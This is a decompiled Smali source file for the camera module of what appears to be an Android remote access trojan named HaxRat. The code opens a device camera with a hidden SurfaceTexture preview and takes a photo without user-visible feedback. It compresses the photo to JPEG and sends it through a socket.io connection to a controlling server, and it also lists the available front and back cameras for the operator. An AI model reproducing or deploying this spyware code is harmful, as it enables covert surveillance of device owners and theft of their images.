.class public Lcom/hax4us/haxrat/CameraManager;
.super Ljava/lang/Object;
.source "CameraManager.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/hax4us/haxrat/CameraManager$100000000;
    }
.end annotation


# instance fields
.field private camera:Landroid/hardware/Camera;

.field private context:Landroid/content/Context;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 5

    .prologue
    .line 26
    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    invoke-direct {v3}, Ljava/lang/Object;-><init>()V

    .line 27
    move-object v3, v0

    move-object v4, v1

    iput-object v4, v3, Lcom/hax4us/haxrat/CameraManager;->context:Landroid/content/Context;

    return-void
.end method

.method static synthetic access$1000003(Lcom/hax4us/haxrat/CameraManager;[B)V
    .locals 6

    move-object v0, p0

    move-object v1, p1

    move-object v4, v0

    move-object v5, v1

    invoke-direct {v4, v5}, Lcom/hax4us/haxrat/CameraManager;->sendPhoto([B)V

    return-void
.end method

.method static synthetic access$1000004(Lcom/hax4us/haxrat/CameraManager;)V
    .locals 4

    move-object v0, p0

    move-object v3, v0

    invoke-direct {v3}, Lcom/hax4us/haxrat/CameraManager;->releaseCamera()V

    return-void
.end method

.method private releaseCamera()V
    .locals 4
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 72
    move-object v0, p0

    move-object v2, v0

    iget-object v2, v2, Lcom/hax4us/haxrat/CameraManager;->camera:Landroid/hardware/Camera;

    if-eqz v2, :cond_0

    .line 73
    move-object v2, v0

    iget-object v2, v2, Lcom/hax4us/haxrat/CameraManager;->camera:Landroid/hardware/Camera;

    invoke-virtual {v2}, Landroid/hardware/Camera;->stopPreview()V

    .line 74
    move-object v2, v0

    iget-object v2, v2, Lcom/hax4us/haxrat/CameraManager;->camera:Landroid/hardware/Camera;

    invoke-virtual {v2}, Landroid/hardware/Camera;->release()V

    .line 75
    move-object v2, v0

    const/4 v3, 0x0

    check-cast v3, Landroid/hardware/Camera;

    iput-object v3, v2, Lcom/hax4us/haxrat/CameraManager;->camera:Landroid/hardware/Camera;

    :cond_0
    return-void
.end method

.method private sendPhoto([B)V
    .locals 14
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "([B)V"
        }
    .end annotation

    .prologue
    .line 56
    move-object v0, p0

    move-object v1, p1

    move-object v7, v1

    const/4 v8, 0x0

    move-object v9, v1

    :try_start_0
    array-length v9, v9

    invoke-static {v7, v8, v9}, Landroid/graphics/BitmapFactory;->decodeByteArray([BII)Landroid/graphics/Bitmap;

    move-result-object v7

    move-object v3, v7

    .line 57
    new-instance v7, Ljava/io/ByteArrayOutputStream;

    move-object v13, v7

    move-object v7, v13

    move-object v8, v13

    invoke-direct {v8}, Ljava/io/ByteArrayOutputStream;-><init>()V

    move-object v4, v7

    .line 58
    move-object v7, v3

    sget-object v8, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v9, 0x14

    move-object v10, v4

    invoke-virtual {v7, v8, v9, v10}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    move-result v7

    .line 59
    new-instance v7, Lorg/json/JSONObject;

    move-object v13, v7

    move-object v7, v13

    move-object v8, v13

    invoke-direct {v8}, Lorg/json/JSONObject;-><init>()V

    move-object v5, v7

    .line 60
    move-object v7, v5

    const-string v8, "image"

    const/4 v9, 0x1

    invoke-virtual {v7, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    move-result-object v7

    .line 61
    move-object v7, v5

    const-string v8, "buffer"

    move-object v9, v4

    invoke-virtual {v9}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v9

    invoke-virtual {v7, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v7

    .line 62
    invoke-static {}, Lcom/hax4us/haxrat/IOSocket;->getInstance()Lcom/hax4us/haxrat/IOSocket;

    move-result-object v7

    invoke-virtual {v7}, Lcom/hax4us/haxrat/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v7

    const-string v8, "0xCA"

    const/4 v9, 0x1

    new-array v9, v9, [Ljava/lang/Object;

    move-object v13, v9

    move-object v9, v13

    move-object v10, v13

    const/4 v11, 0x0

    move-object v12, v5

    aput-object v12, v10, v11

    invoke-virtual {v7, v8, v9}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v7

    .line 66
    :goto_0
    return-void

    .line 62
    :catch_0
    move-exception v7

    move-object v3, v7

    .line 66
    move-object v7, v3

    invoke-virtual {v7}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method


# virtual methods
.method public findCameraList()Lorg/json/JSONObject;
    .locals 13

    .prologue
    .line 81
    move-object v0, p0

    move-object v9, v0

    iget-object v9, v9, Lcom/hax4us/haxrat/CameraManager;->context:Landroid/content/Context;

    invoke-virtual {v9}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v9

    const-string v10, "android.hardware.camera"

    invoke-virtual {v9, v10}, Landroid/content/pm/PackageManager;->hasSystemFeature(Ljava/lang/String;)Z

    move-result v9

    if-nez v9, :cond_0

    .line 82
    const/4 v9, 0x0

    check-cast v9, Lorg/json/JSONObject;

    move-object v0, v9

    .line 123
    :goto_0
    return-object v0

    .line 87
    :cond_0
    :try_start_0
    new-instance v9, Lorg/json/JSONObject;

    move-object v12, v9

    move-object v9, v12

    move-object v10, v12

    invoke-direct {v10}, Lorg/json/JSONObject;-><init>()V

    move-object v2, v9

    .line 88
    new-instance v9, Lorg/json/JSONArray;

    move-object v12, v9

    move-object v9, v12

    move-object v10, v12

    invoke-direct {v10}, Lorg/json/JSONArray;-><init>()V

    move-object v3, v9

    .line 89
    move-object v9, v2

    const-string v10, "camList"

    const/4 v11, 0x1

    invoke-virtual {v9, v10, v11}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    move-result-object v9

    .line 92
    invoke-static {}, Landroid/hardware/Camera;->getNumberOfCameras()I

    move-result v9

    move v4, v9

    .line 93
    const/4 v9, 0x0

    move v5, v9

    :goto_1
    move v9, v5

    move v10, v4

    if-lt v9, v10, :cond_1

    .line 116
    move-object v9, v2

    const-string v10, "list"

    move-object v11, v3

    invoke-virtual {v9, v10, v11}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v9

    .line 117
    move-object v9, v2

    move-object v0, v9

    goto :goto_0

    .line 94
    :cond_1
    new-instance v9, Landroid/hardware/Camera$CameraInfo;

    move-object v12, v9

    move-object v9, v12

    move-object v10, v12

    invoke-direct {v10}, Landroid/hardware/Camera$CameraInfo;-><init>()V

    move-object v6, v9

    .line 95
    move v9, v5

    move-object v10, v6

    invoke-static {v9, v10}, Landroid/hardware/Camera;->getCameraInfo(ILandroid/hardware/Camera$CameraInfo;)V

    .line 96
    move-object v9, v6

    iget v9, v9, Landroid/hardware/Camera$CameraInfo;->facing:I

    const/4 v10, 0x1

    if-ne v9, v10, :cond_2

    .line 97
    new-instance v9, Lorg/json/JSONObject;

    move-object v12, v9

    move-object v9, v12

    move-object v10, v12

    invoke-direct {v10}, Lorg/json/JSONObject;-><init>()V

    move-object v7, v9

    .line 98
    move-object v9, v7

    const-string v10, "name"

    const-string v11, "Front"

    invoke-virtual {v9, v10, v11}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v9

    .line 99
    move-object v9, v7

    const-string v10, "id"

    move v11, v5

    invoke-virtual {v9, v10, v11}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    move-result-object v9

    .line 100
    move-object v9, v3

    move-object v10, v7

    invoke-virtual {v9, v10}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    move-result-object v9

    .line 93
    :goto_2
    add-int/lit8 v5, v5, 0x1

    goto :goto_1

    .line 102
    :cond_2
    move-object v9, v6

    iget v9, v9, Landroid/hardware/Camera$CameraInfo;->facing:I

    const/4 v10, 0x0

    if-ne v9, v10, :cond_3

    .line 103
    new-instance v9, Lorg/json/JSONObject;

    move-object v12, v9

    move-object v9, v12

    move-object v10, v12

    invoke-direct {v10}, Lorg/json/JSONObject;-><init>()V

    move-object v7, v9

    .line 104
    move-object v9, v7

    const-string v10, "name"

    const-string v11, "Back"

    invoke-virtual {v9, v10, v11}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v9

    .line 105
    move-object v9, v7

    const-string v10, "id"

    move v11, v5

    invoke-virtual {v9, v10, v11}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    move-result-object v9

    .line 106
    move-object v9, v3

    move-object v10, v7

    invoke-virtual {v9, v10}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    move-result-object v9

    goto :goto_2

    .line 109
    :cond_3
    new-instance v9, Lorg/json/JSONObject;

    move-object v12, v9

    move-object v9, v12

    move-object v10, v12

    invoke-direct {v10}, Lorg/json/JSONObject;-><init>()V

    move-object v7, v9

    .line 110
    move-object v9, v7

    const-string v10, "name"

    const-string v11, "Other"

    invoke-virtual {v9, v10, v11}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v9

    .line 111
    move-object v9, v7

    const-string v10, "id"

    move v11, v5

    invoke-virtual {v9, v10, v11}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    move-result-object v9

    .line 112
    move-object v9, v3

    move-object v10, v7

    invoke-virtual {v9, v10}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v9

    goto :goto_2

    .line 117
    :catch_0
    move-exception v9

    move-object v2, v9

    .line 120
    move-object v9, v2

    invoke-virtual {v9}, Lorg/json/JSONException;->printStackTrace()V

    .line 123
    const/4 v9, 0x0

    check-cast v9, Lorg/json/JSONObject;

    move-object v0, v9

    goto/16 :goto_0
.end method

.method public startUp(I)V
    .locals 13
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(I)V"
        }
    .end annotation

    .prologue
    .line 32
    move-object v0, p0

    move v1, p1

    move-object v6, v0

    move v7, v1

    invoke-static {v7}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v7

    iput-object v7, v6, Lcom/hax4us/haxrat/CameraManager;->camera:Landroid/hardware/Camera;

    .line 33
    move-object v6, v0

    iget-object v6, v6, Lcom/hax4us/haxrat/CameraManager;->camera:Landroid/hardware/Camera;

    invoke-virtual {v6}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v6

    move-object v3, v6

    .line 34
    move-object v6, v0

    iget-object v6, v6, Lcom/hax4us/haxrat/CameraManager;->camera:Landroid/hardware/Camera;

    move-object v7, v3

    invoke-virtual {v6, v7}, Landroid/hardware/Camera;->setParameters(Landroid/hardware/Camera$Parameters;)V

    .line 36
    move-object v6, v0

    :try_start_0
    iget-object v6, v6, Lcom/hax4us/haxrat/CameraManager;->camera:Landroid/hardware/Camera;

    new-instance v7, Landroid/graphics/SurfaceTexture;

    move-object v12, v7

    move-object v7, v12

    move-object v8, v12

    const/4 v9, 0x0

    invoke-direct {v8, v9}, Landroid/graphics/SurfaceTexture;-><init>(I)V

    invoke-virtual {v6, v7}, Landroid/hardware/Camera;->setPreviewTexture(Landroid/graphics/SurfaceTexture;)V

    .line 37
    move-object v6, v0

    iget-object v6, v6, Lcom/hax4us/haxrat/CameraManager;->camera:Landroid/hardware/Camera;

    invoke-virtual {v6}, Landroid/hardware/Camera;->startPreview()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 42
    :goto_0
    move-object v6, v0

    iget-object v6, v6, Lcom/hax4us/haxrat/CameraManager;->camera:Landroid/hardware/Camera;

    const/4 v7, 0x0

    check-cast v7, Landroid/hardware/Camera$ShutterCallback;

    const/4 v8, 0x0

    check-cast v8, Landroid/hardware/Camera$PictureCallback;

    new-instance v9, Lcom/hax4us/haxrat/CameraManager$100000000;

    move-object v12, v9

    move-object v9, v12

    move-object v10, v12

    move-object v11, v0

    invoke-direct {v10, v11}, Lcom/hax4us/haxrat/CameraManager$100000000;-><init>(Lcom/hax4us/haxrat/CameraManager;)V

    invoke-virtual {v6, v7, v8, v9}, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;)V

    return-void

    .line 37
    :catch_0
    move-exception v6

    move-object v4, v6

    .line 39
    move-object v6, v4

    invoke-virtual {v6}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method
